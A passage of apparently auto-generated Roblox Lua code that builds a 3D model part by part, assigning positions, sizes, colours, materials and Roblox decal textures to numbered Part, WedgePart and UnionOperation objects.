        Part268.Size = Vector3.new(0.5999999046325684, 0.699999988079071, 0.3999999463558197)
        Part268.Anchored = true
        Part268.BottomSurface = Enum.SurfaceType.Smooth
        Part268.BrickColor = BrickColor.new("Dark stone grey")
        Part268.Material = Enum.Material.SmoothPlastic
        Part268.TopSurface = Enum.SurfaceType.Smooth
        Part268.brickColor = BrickColor.new("Dark stone grey")
        Decal269.Parent = Part268
        Decal269.Texture = "http://www.roblox.com/asset/?id=10247580"
        Part270.Parent = Model261
        Part270.CFrame = CFrame.new(-15.71667, 11858.4004, -26.1999855, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part270.Orientation = Vector3.new(0, -90, 0)
        Part270.Position = Vector3.new(-15.716670036315918, 11858.400390625, -26.19998550415039)
        Part270.Rotation = Vector3.new(0, -90, 0)
        Part270.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part270.Size = Vector3.new(0.3999999165534973, 0.10000000149011612, 0.19999995827674866)
        Part270.Anchored = true
        Part270.BottomSurface = Enum.SurfaceType.Smooth
        Part270.BrickColor = BrickColor.new("Really black")
        Part270.Material = Enum.Material.SmoothPlastic
        Part270.TopSurface = Enum.SurfaceType.Smooth
        Part270.brickColor = BrickColor.new("Really black")
        UnionOperation271.Parent = Model261
        UnionOperation271.CFrame = CFrame.new(-15.7916555, 11858.3115, -26.1999931, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation271.Orientation = Vector3.new(0, -90, 0)
        UnionOperation271.Position = Vector3.new(-15.791655540466309, 11858.3115234375, -26.199993133544922)
        UnionOperation271.Rotation = Vector3.new(0, -90, 0)
        UnionOperation271.Color = Color3.new(0.623529, 0.631373, 0.67451)
        UnionOperation271.Size = Vector3.new(0.4000091552734375, 1.0789999961853027, 0.250030517578125)
        UnionOperation271.Anchored = true
        UnionOperation271.BrickColor = BrickColor.new("Fossil")
        UnionOperation271.Material = Enum.Material.Metal
        UnionOperation271.brickColor = BrickColor.new("Fossil")
        Part272.Parent = Model261
        Part272.CFrame = CFrame.new(-15.71667, 11859.1006, -25.299984, 0, 0, -1, 1, 0, 0, 0, -1, 0)
        Part272.Orientation = Vector3.new(0, -90, 90)
        Part272.Position = Vector3.new(-15.716670036315918, 11859.1005859375, -25.299983978271484)
        Part272.Rotation = Vector3.new(-90, -90, 0)
        Part272.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part272.Size = Vector3.new(0.699999988079071, 0.19999995827674866, 0.19999995827674866)
        Part272.Anchored = true
        Part272.BottomSurface = Enum.SurfaceType.Smooth
        Part272.BrickColor = BrickColor.new("Really black")
        Part272.Material = Enum.Material.SmoothPlastic
        Part272.TopSurface = Enum.SurfaceType.Smooth
        Part272.brickColor = BrickColor.new("Really black")
        Part272.Shape = Enum.PartType.Cylinder
        Part273.Parent = Model261
        Part273.CFrame = CFrame.new(-15.71667, 11858.7998, -25.299984, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part273.Orientation = Vector3.new(0, -90, 0)
        Part273.Position = Vector3.new(-15.716670036315918, 11858.7998046875, -25.299983978271484)
        Part273.Rotation = Vector3.new(0, -90, 0)
        Part273.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part273.Size = Vector3.new(0.5999999046325684, 0.699999988079071, 0.3999999463558197)
        Part273.Anchored = true
        Part273.BottomSurface = Enum.SurfaceType.Smooth
        Part273.BrickColor = BrickColor.new("Dark stone grey")
        Part273.Material = Enum.Material.SmoothPlastic
        Part273.TopSurface = Enum.SurfaceType.Smooth
        Part273.brickColor = BrickColor.new("Dark stone grey")
        Decal274.Parent = Part273
        Decal274.Texture = "http://www.roblox.com/asset/?id=27093902"
        WedgePart275.Parent = Model261
        WedgePart275.CFrame = CFrame.new(-15.8666677, 11859.251, -24.8999901, 0, 0, -1, 0, -1, -0, -1, 0, -0)
        WedgePart275.Orientation = Vector3.new(0, -90, 180)
        WedgePart275.Position = Vector3.new(-15.866667747497559, 11859.2509765625, -24.89999008178711)
        WedgePart275.Rotation = Vector3.new(-180, -90, 0)
        WedgePart275.Color = Color3.new(0.972549, 0.972549, 0.972549)
        WedgePart275.Size = Vector3.new(5.800000190734863, 0.4000000059604645, 0.5)
        WedgePart275.Anchored = true
        WedgePart275.BottomSurface = Enum.SurfaceType.Smooth
        WedgePart275.BrickColor = BrickColor.new("Institutional white")
        WedgePart275.Material = Enum.Material.SmoothPlastic
        WedgePart275.brickColor = BrickColor.new("Institutional white")
        Part276.Parent = Model261
        Part276.CFrame = CFrame.new(-15.666667, 11859.501, -24.8999901, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part276.Orientation = Vector3.new(0, -90, 0)
        Part276.Position = Vector3.new(-15.666666984558105, 11859.5009765625, -24.89999008178711)
        Part276.Rotation = Vector3.new(0, -90, 0)
        Part276.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part276.Size = Vector3.new(5.800000190734863, 0.09999990463256836, 2.0999999046325684)
        Part276.Anchored = true
        Part276.BottomSurface = Enum.SurfaceType.Smooth
        Part276.BrickColor = BrickColor.new("Institutional white")
        Part276.Material = Enum.Material.SmoothPlastic
        Part276.TopSurface = Enum.SurfaceType.Smooth
        Part276.brickColor = BrickColor.new("Institutional white")
        Decal277.Name = "roblox"
        Decal277.Parent = Part276
        Decal277.Face = Enum.NormalId.Bottom
        Part278.Parent = Model261
        Part278.CFrame = CFrame.new(-15.6666708, 11861.501, -24.8999825, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part278.Orientation = Vector3.new(0, -90, 0)
        Part278.Position = Vector3.new(-15.666670799255371, 11861.5009765625, -24.899982452392578)
        Part278.Rotation = Vector3.new(0, -90, 0)
        Part278.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part278.Size = Vector3.new(6, 0.09999996423721313, 2.299999713897705)
        Part278.Anchored = true
        Part278.BottomSurface = Enum.SurfaceType.Smooth
        Part278.BrickColor = BrickColor.new("Really black")
        Part278.Material = Enum.Material.SmoothPlastic
        Part278.TopSurface = Enum.SurfaceType.Smooth
        Part278.brickColor = BrickColor.new("Really black")
        Part279.Parent = Model261
        Part279.CFrame = CFrame.new(-15.666667, 11860.501, -24.8999901, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part279.Orientation = Vector3.new(0, -90, 0)
        Part279.Position = Vector3.new(-15.666666984558105, 11860.5009765625, -24.89999008178711)
        Part279.Rotation = Vector3.new(0, -90, 0)
        Part279.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part279.Size = Vector3.new(5.800000190734863, 1.899999976158142, 2.0999999046325684)
        Part279.Anchored = true
        Part279.BottomSurface = Enum.SurfaceType.Smooth
        Part279.BrickColor = BrickColor.new("Institutional white")
        Part279.Material = Enum.Material.SmoothPlastic
        Part279.TopSurface = Enum.SurfaceType.Smooth
        Part279.brickColor = BrickColor.new("Institutional white")
        Part280.Parent = Model261
        Part280.CFrame = CFrame.new(-15.71667, 11859.1006, -24.3999805, 0, 0, -1, 1, 0, 0, 0, -1, 0)
        Part280.Orientation = Vector3.new(0, -90, 90)
        Part280.Position = Vector3.new(-15.716670036315918, 11859.1005859375, -24.399980545043945)
        Part280.Rotation = Vector3.new(-90, -90, 0)
        Part280.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part280.Size = Vector3.new(0.699999988079071, 0.19999995827674866, 0.19999995827674866)
        Part280.Anchored = true
        Part280.BottomSurface = Enum.SurfaceType.Smooth
        Part280.BrickColor = BrickColor.new("Really black")
        Part280.Material = Enum.Material.SmoothPlastic
        Part280.TopSurface = Enum.SurfaceType.Smooth
        Part280.brickColor = BrickColor.new("Really black")
        Part280.Shape = Enum.PartType.Cylinder
        Part281.Parent = Model261
        Part281.CFrame = CFrame.new(-15.3499975, 11857.2422, -27.7416496, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part281.Orientation = Vector3.new(0, -90, 0)
        Part281.Position = Vector3.new(-15.349997520446777, 11857.2421875, -27.741649627685547)
        Part281.Rotation = Vector3.new(0, -90, 0)
        Part281.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part281.Size = Vector3.new(0.08333325386047363, 0.4166666269302368, 1.4999998807907104)
        Part281.Anchored = true
        Part281.BottomSurface = Enum.SurfaceType.Smooth
        Part281.BrickColor = BrickColor.new("Dark stone grey")
        Part281.Material = Enum.Material.SmoothPlastic
        Part281.TopSurface = Enum.SurfaceType.Smooth
        Part281.brickColor = BrickColor.new("Dark stone grey")
        Part282.Parent = Model261
        Part282.CFrame = CFrame.new(-15.3500013, 11857.4092, -27.449976, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part282.Orientation = Vector3.new(0, -90, 0)
        Part282.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -27.449975967407227)
        Part282.Rotation = Vector3.new(0, -90, 0)
        Part282.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part282.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part282.Anchored = true
        Part282.BottomSurface = Enum.SurfaceType.Smooth
        Part282.BrickColor = BrickColor.new("Really black")
        Part282.Material = Enum.Material.SmoothPlastic
        Part282.TopSurface = Enum.SurfaceType.Smooth
        Part282.brickColor = BrickColor.new("Really black")
        Part283.Parent = Model261
        Part283.CFrame = CFrame.new(-15.3500013, 11857.4092, -26.7833042, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part283.Orientation = Vector3.new(0, -90, 0)
        Part283.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -26.78330421447754)
        Part283.Rotation = Vector3.new(0, -90, 0)
        Part283.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part283.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part283.Anchored = true
        Part283.BottomSurface = Enum.SurfaceType.Smooth
        Part283.BrickColor = BrickColor.new("Really black")
        Part283.Material = Enum.Material.SmoothPlastic
        Part283.TopSurface = Enum.SurfaceType.Smooth
        Part283.brickColor = BrickColor.new("Really black")
        Part284.Parent = Model261
        Part284.CFrame = CFrame.new(-15.3499975, 11857.4092, -27.1166496, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part284.Orientation = Vector3.new(0, -90, 0)
        Part284.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -27.116649627685547)
        Part284.Rotation = Vector3.new(0, -90, 0)
        Part284.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part284.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part284.Anchored = true
        Part284.BottomSurface = Enum.SurfaceType.Smooth
        Part284.BrickColor = BrickColor.new("Really black")
        Part284.Material = Enum.Material.SmoothPlastic
        Part284.TopSurface = Enum.SurfaceType.Smooth
        Part284.brickColor = BrickColor.new("Really black")
        Part285.Parent = Model261
        Part285.CFrame = CFrame.new(-15.3499975, 11857.4092, -25.7833118, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part285.Orientation = Vector3.new(0, -90, 0)
        Part285.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -25.78331184387207)
        Part285.Rotation = Vector3.new(0, -90, 0)
        Part285.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part285.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part285.Anchored = true
        Part285.BottomSurface = Enum.SurfaceType.Smooth
        Part285.BrickColor = BrickColor.new("Really black")
        Part285.Material = Enum.Material.SmoothPlastic
        Part285.TopSurface = Enum.SurfaceType.Smooth
        Part285.brickColor = BrickColor.new("Really black")
        Part286.Parent = Model261
        Part286.CFrame = CFrame.new(-15.3500013, 11857.4092, -26.116642, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part286.Orientation = Vector3.new(0, -90, 0)
        Part286.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -26.116641998291016)
        Part286.Rotation = Vector3.new(0, -90, 0)
        Part286.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part286.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part286.Anchored = true
        Part286.BottomSurface = Enum.SurfaceType.Smooth
        Part286.BrickColor = BrickColor.new("Really black")
        Part286.Material = Enum.Material.SmoothPlastic
        Part286.TopSurface = Enum.SurfaceType.Smooth
        Part286.brickColor = BrickColor.new("Really black")
        Part287.Parent = Model261
        Part287.CFrame = CFrame.new(-15.3499975, 11857.4092, -26.4499779, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part287.Orientation = Vector3.new(0, -90, 0)
        Part287.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -26.44997787475586)
        Part287.Rotation = Vector3.new(0, -90, 0)
        Part287.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part287.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part287.Anchored = true
        Part287.BottomSurface = Enum.SurfaceType.Smooth
        Part287.BrickColor = BrickColor.new("Really black")
        Part287.Material = Enum.Material.SmoothPlastic
        Part287.TopSurface = Enum.SurfaceType.Smooth
        Part287.brickColor = BrickColor.new("Really black")
        Part288.Parent = Model261
        Part288.CFrame = CFrame.new(-15.71667, 11858.4004, -25.299984, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part288.Orientation = Vector3.new(0, -90, 0)
        Part288.Position = Vector3.new(-15.716670036315918, 11858.400390625, -25.299983978271484)
        Part288.Rotation = Vector3.new(0, -90, 0)
        Part288.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part288.Size = Vector3.new(0.3999999165534973, 0.10000000149011612, 0.19999995827674866)
        Part288.Anchored = true
        Part288.BottomSurface = Enum.SurfaceType.Smooth
        Part288.BrickColor = BrickColor.new("Really black")
        Part288.Material = Enum.Material.SmoothPlastic
        Part288.TopSurface = Enum.SurfaceType.Smooth
        Part288.brickColor = BrickColor.new("Really black")
        UnionOperation289.Parent = Model261
        UnionOperation289.CFrame = CFrame.new(-15.7916555, 11858.3115, -25.2999916, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation289.Orientation = Vector3.new(0, -90, 0)
        UnionOperation289.Position = Vector3.new(-15.791655540466309, 11858.3115234375, -25.299991607666016)
        UnionOperation289.Rotation = Vector3.new(0, -90, 0)
        UnionOperation289.Color = Color3.new(0.623529, 0.631373, 0.67451)
        UnionOperation289.Size = Vector3.new(0.4000091552734375, 1.0789999961853027, 0.250030517578125)
        UnionOperation289.Anchored = true
        UnionOperation289.BrickColor = BrickColor.new("Fossil")
        UnionOperation289.Material = Enum.Material.Metal
        UnionOperation289.brickColor = BrickColor.new("Fossil")
        Part290.Parent = Model261
        Part290.CFrame = CFrame.new(-15.3500013, 11857.4092, -24.7833138, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part290.Orientation = Vector3.new(0, -90, 0)
        Part290.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -24.783313751220703)
        Part290.Rotation = Vector3.new(0, -90, 0)
        Part290.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part290.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part290.Anchored = true
        Part290.BottomSurface = Enum.SurfaceType.Smooth
        Part290.BrickColor = BrickColor.new("Really black")
        Part290.Material = Enum.Material.SmoothPlastic
        Part290.TopSurface = Enum.SurfaceType.Smooth
        Part290.brickColor = BrickColor.new("Really black")
        Part291.Parent = Model261
        Part291.CFrame = CFrame.new(-15.3499975, 11857.4092, -25.1166439, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part291.Orientation = Vector3.new(0, -90, 0)
        Part291.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -25.11664390563965)
        Part291.Rotation = Vector3.new(0, -90, 0)
        Part291.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part291.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part291.Anchored = true
        Part291.BottomSurface = Enum.SurfaceType.Smooth
        Part291.BrickColor = BrickColor.new("Really black")
        Part291.Material = Enum.Material.SmoothPlastic
        Part291.TopSurface = Enum.SurfaceType.Smooth
        Part291.brickColor = BrickColor.new("Really black")
        Part292.Parent = Model261
        Part292.CFrame = CFrame.new(-15.3499975, 11857.4092, -25.4499779, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part292.Orientation = Vector3.new(0, -90, 0)
        Part292.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -25.44997787475586)
        Part292.Rotation = Vector3.new(0, -90, 0)
        Part292.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part292.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part292.Anchored = true
        Part292.BottomSurface = Enum.SurfaceType.Smooth
        Part292.BrickColor = BrickColor.new("Really black")
        Part292.Material = Enum.Material.SmoothPlastic
        Part292.TopSurface = Enum.SurfaceType.Smooth
        Part292.brickColor = BrickColor.new("Really black")
        Part293.Parent = Model261
        Part293.CFrame = CFrame.new(-15.71667, 11858.4004, -24.3999805, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part293.Orientation = Vector3.new(0, -90, 0)
        Part293.Position = Vector3.new(-15.716670036315918, 11858.400390625, -24.399980545043945)
        Part293.Rotation = Vector3.new(0, -90, 0)
        Part293.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part293.Size = Vector3.new(0.3999999165534973, 0.10000000149011612, 0.19999995827674866)
        Part293.Anchored = true
        Part293.BottomSurface = Enum.SurfaceType.Smooth
        Part293.BrickColor = BrickColor.new("Really black")
        Part293.Material = Enum.Material.SmoothPlastic
        Part293.TopSurface = Enum.SurfaceType.Smooth
        Part293.brickColor = BrickColor.new("Really black")
        UnionOperation294.Parent = Model261
        UnionOperation294.CFrame = CFrame.new(-15.7916555, 11858.3115, -24.3999882, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        UnionOperation294.Orientation = Vector3.new(0, -90, 0)
        UnionOperation294.Position = Vector3.new(-15.791655540466309, 11858.3115234375, -24.399988174438477)
        UnionOperation294.Rotation = Vector3.new(0, -90, 0)
        UnionOperation294.Color = Color3.new(0.623529, 0.631373, 0.67451)
        UnionOperation294.Size = Vector3.new(0.4000091552734375, 1.0789999961853027, 0.250030517578125)
        UnionOperation294.Anchored = true
        UnionOperation294.BrickColor = BrickColor.new("Fossil")
        UnionOperation294.Material = Enum.Material.Metal
        UnionOperation294.brickColor = BrickColor.new("Fossil")
        Part295.Parent = Model261
        Part295.CFrame = CFrame.new(-16.4166718, 11858.2002, -24.8999901, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part295.Orientation = Vector3.new(0, -90, 0)
        Part295.Position = Vector3.new(-16.416671752929688, 11858.2001953125, -24.89999008178711)
        Part295.Rotation = Vector3.new(0, -90, 0)
        Part295.Color = Color3.new(0.972549, 0.972549, 0.972549)
        Part295.Size = Vector3.new(5.800000190734863, 2.5, 0.5999999046325684)
        Part295.Anchored = true
        Part295.BottomSurface = Enum.SurfaceType.Smooth
        Part295.BrickColor = BrickColor.new("Institutional white")
        Part295.Material = Enum.Material.SmoothPlastic
        Part295.TopSurface = Enum.SurfaceType.Smooth
        Part295.brickColor = BrickColor.new("Institutional white")
        Part296.Parent = Model261
        Part296.CFrame = CFrame.new(-15.71667, 11858.7998, -24.3999805, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part296.Orientation = Vector3.new(0, -90, 0)
        Part296.Position = Vector3.new(-15.716670036315918, 11858.7998046875, -24.399980545043945)
        Part296.Rotation = Vector3.new(0, -90, 0)
        Part296.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part296.Size = Vector3.new(0.5999999046325684, 0.699999988079071, 0.3999999463558197)
        Part296.Anchored = true
        Part296.BottomSurface = Enum.SurfaceType.Smooth
        Part296.BrickColor = BrickColor.new("Dark stone grey")
        Part296.Material = Enum.Material.SmoothPlastic
        Part296.TopSurface = Enum.SurfaceType.Smooth
        Part296.brickColor = BrickColor.new("Dark stone grey")
        Decal297.Parent = Part296
        Decal297.Texture = "http://www.roblox.com/asset/?id=28722388"
        Part298.Parent = Model261
        Part298.CFrame = CFrame.new(-15.71667, 11859.1006, -23.4999809, 0, 0, -1, 1, 0, 0, 0, -1, 0)
        Part298.Orientation = Vector3.new(0, -90, 90)
        Part298.Position = Vector3.new(-15.716670036315918, 11859.1005859375, -23.499980926513672)
        Part298.Rotation = Vector3.new(-90, -90, 0)
        Part298.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part298.Size = Vector3.new(0.699999988079071, 0.19999995827674866, 0.19999995827674866)
        Part298.Anchored = true
        Part298.BottomSurface = Enum.SurfaceType.Smooth
        Part298.BrickColor = BrickColor.new("Really black")
        Part298.Material = Enum.Material.SmoothPlastic
        Part298.TopSurface = Enum.SurfaceType.Smooth
        Part298.brickColor = BrickColor.new("Really black")
        Part298.Shape = Enum.PartType.Cylinder
        Part299.Parent = Model261
        Part299.CFrame = CFrame.new(-15.71667, 11859.1006, -23.4999809, 0, 0, -1, 1, 0, 0, 0, -1, 0)
        Part299.Orientation = Vector3.new(0, -90, 90)
        Part299.Position = Vector3.new(-15.716670036315918, 11859.1005859375, -23.499980926513672)
        Part299.Rotation = Vector3.new(-90, -90, 0)
        Part299.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part299.Size = Vector3.new(0.699999988079071, 0.19999995827674866, 0.19999995827674866)
        Part299.Anchored = true
        Part299.BottomSurface = Enum.SurfaceType.Smooth
        Part299.BrickColor = BrickColor.new("Really black")
        Part299.Material = Enum.Material.SmoothPlastic
        Part299.TopSurface = Enum.SurfaceType.Smooth
        Part299.brickColor = BrickColor.new("Really black")
        Part299.Shape = Enum.PartType.Cylinder
        Part300.Parent = Model261
        Part300.CFrame = CFrame.new(-15.71667, 11859.1006, -22.5999889, 0, 0, -1, 1, 0, 0, 0, -1, 0)
        Part300.Orientation = Vector3.new(0, -90, 90)
        Part300.Position = Vector3.new(-15.716670036315918, 11859.1005859375, -22.59998893737793)
        Part300.Rotation = Vector3.new(-90, -90, 0)
        Part300.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part300.Size = Vector3.new(0.699999988079071, 0.19999995827674866, 0.19999995827674866)
        Part300.Anchored = true
        Part300.BottomSurface = Enum.SurfaceType.Smooth
        Part300.BrickColor = BrickColor.new("Really black")
        Part300.Material = Enum.Material.SmoothPlastic
        Part300.TopSurface = Enum.SurfaceType.Smooth
        Part300.brickColor = BrickColor.new("Really black")
        Part300.Shape = Enum.PartType.Cylinder
        Part301.Parent = Model261
        Part301.CFrame = CFrame.new(-15.3500013, 11857.4092, -24.4499855, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part301.Orientation = Vector3.new(0, -90, 0)
        Part301.Position = Vector3.new(-15.350001335144043, 11857.4091796875, -24.44998550415039)
        Part301.Rotation = Vector3.new(0, -90, 0)
        Part301.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part301.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part301.Anchored = true
        Part301.BottomSurface = Enum.SurfaceType.Smooth
        Part301.BrickColor = BrickColor.new("Really black")
        Part301.Material = Enum.Material.SmoothPlastic
        Part301.TopSurface = Enum.SurfaceType.Smooth
        Part301.brickColor = BrickColor.new("Really black")
        Part302.Parent = Model261
        Part302.CFrame = CFrame.new(-16.0583382, 11857.2422, -24.8666477, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part302.Orientation = Vector3.new(0, -90, 0)
        Part302.Position = Vector3.new(-16.058338165283203, 11857.2421875, -24.866647720336914)
        Part302.Rotation = Vector3.new(0, -90, 0)
        Part302.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part302.Size = Vector3.new(5.666666507720947, 0.4166666269302368, 0.08333325386047363)
        Part302.Anchored = true
        Part302.BottomSurface = Enum.SurfaceType.Smooth
        Part302.BrickColor = BrickColor.new("Dark stone grey")
        Part302.Material = Enum.Material.SmoothPlastic
        Part302.TopSurface = Enum.SurfaceType.Smooth
        Part302.brickColor = BrickColor.new("Dark stone grey")
        Part303.Parent = Model261
        Part303.CFrame = CFrame.new(-14.6416693, 11857.2422, -24.8666573, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part303.Orientation = Vector3.new(0, -90, 0)
        Part303.Position = Vector3.new(-14.641669273376465, 11857.2421875, -24.866657257080078)
        Part303.Rotation = Vector3.new(0, -90, 0)
        Part303.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part303.Size = Vector3.new(5.666666507720947, 0.41666650772094727, 0.08333325386047363)
        Part303.Anchored = true
        Part303.BottomSurface = Enum.SurfaceType.Smooth
        Part303.BrickColor = BrickColor.new("Dark stone grey")
        Part303.Material = Enum.Material.SmoothPlastic
        Part303.TopSurface = Enum.SurfaceType.Smooth
        Part303.brickColor = BrickColor.new("Dark stone grey")
        Part304.Parent = Model261
        Part304.CFrame = CFrame.new(-15.3499937, 11856.9922, -24.8666496, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part304.Orientation = Vector3.new(0, -90, 0)
        Part304.Position = Vector3.new(-15.349993705749512, 11856.9921875, -24.866649627685547)
        Part304.Rotation = Vector3.new(0, -90, 0)
        Part304.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part304.Size = Vector3.new(5.8333330154418945, 0.08333329856395721, 1.4999998807907104)
        Part304.Anchored = true
        Part304.BottomSurface = Enum.SurfaceType.Smooth
        Part304.BrickColor = BrickColor.new("Dark stone grey")
        Part304.Material = Enum.Material.SmoothPlastic
        Part304.TopSurface = Enum.SurfaceType.Smooth
        Part304.brickColor = BrickColor.new("Dark stone grey")
        Part305.Parent = Model261
        Part305.CFrame = CFrame.new(-15.3499975, 11857.4092, -23.7833138, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part305.Orientation = Vector3.new(0, -90, 0)
        Part305.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -23.783313751220703)
        Part305.Rotation = Vector3.new(0, -90, 0)
        Part305.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part305.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part305.Anchored = true
        Part305.BottomSurface = Enum.SurfaceType.Smooth
        Part305.BrickColor = BrickColor.new("Really black")
        Part305.Material = Enum.Material.SmoothPlastic
        Part305.TopSurface = Enum.SurfaceType.Smooth
        Part305.brickColor = BrickColor.new("Really black")
        Part306.Parent = Model261
        Part306.CFrame = CFrame.new(-15.3499975, 11857.4092, -24.1166515, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part306.Orientation = Vector3.new(0, -90, 0)
        Part306.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -24.11665153503418)
        Part306.Rotation = Vector3.new(0, -90, 0)
        Part306.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part306.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part306.Anchored = true
        Part306.BottomSurface = Enum.SurfaceType.Smooth
        Part306.BrickColor = BrickColor.new("Really black")
        Part306.Material = Enum.Material.SmoothPlastic
        Part306.TopSurface = Enum.SurfaceType.Smooth
        Part306.brickColor = BrickColor.new("Really black")
        Part307.Parent = Model261
        Part307.CFrame = CFrame.new(-15.3499975, 11857.4092, -23.4499798, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part307.Orientation = Vector3.new(0, -90, 0)
        Part307.Position = Vector3.new(-15.349997520446777, 11857.4091796875, -23.449979782104492)
        Part307.Rotation = Vector3.new(0, -90, 0)
        Part307.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part307.Size = Vector3.new(0.16666650772094727, 0.0833333358168602, 1.3333333730697632)
        Part307.Anchored = true
        Part307.BottomSurface = Enum.SurfaceType.Smooth
        Part307.BrickColor = BrickColor.new("Really black")
        Part307.Material = Enum.Material.SmoothPlastic
        Part307.TopSurface = Enum.SurfaceType.Smooth
        Part307.brickColor = BrickColor.new("Really black")
        Part308.Parent = Model261
        Part308.CFrame = CFrame.new(-15.71667, 11858.7998, -22.5999889, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part308.Orientation = Vector3.new(0, -90, 0)
        Part308.Position = Vector3.new(-15.716670036315918, 11858.7998046875, -22.59998893737793)
        Part308.Rotation = Vector3.new(0, -90, 0)
        Part308.Color = Color3.new(0.388235, 0.372549, 0.384314)
        Part308.Size = Vector3.new(0.5999999046325684, 0.699999988079071, 0.3999999463558197)
        Part308.Anchored = true
        Part308.BottomSurface = Enum.SurfaceType.Smooth
        Part308.BrickColor = BrickColor.new("Dark stone grey")
        Part308.Material = Enum.Material.SmoothPlastic
        Part308.TopSurface = Enum.SurfaceType.Smooth
        Part308.brickColor = BrickColor.new("Dark stone grey")
        Decal309.Parent = Part308
        Decal309.Texture = "http://www.roblox.com/asset/?id=18452708"
        Part310.Parent = Model261
        Part310.CFrame = CFrame.new(-15.71667, 11858.4004, -22.5999889, 0, 0, -1, 0, 1, 0, 1, 0, 0)
        Part310.Orientation = Vector3.new(0, -90, 0)
        Part310.Position = Vector3.new(-15.716670036315918, 11858.400390625, -22.59998893737793)
        Part310.Rotation = Vector3.new(0, -90, 0)
        Part310.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
        Part310.Size = Vector3.new(0.3999999165534973, 0.10000000149011612, 0.19999995827674866)
        Part310.Anchored = true
        Part310.BottomSurface = Enum.SurfaceType.Smooth
        Part310.BrickColor = BrickColor.new("Really black")
        Part310.Material = Enum.Material.SmoothPlastic
        Part310.TopSurface = Enum.SurfaceType.Smooth
        Part310.brickColor = BrickColor.new("Really black")
        UnionOperation311.Parent = Model261
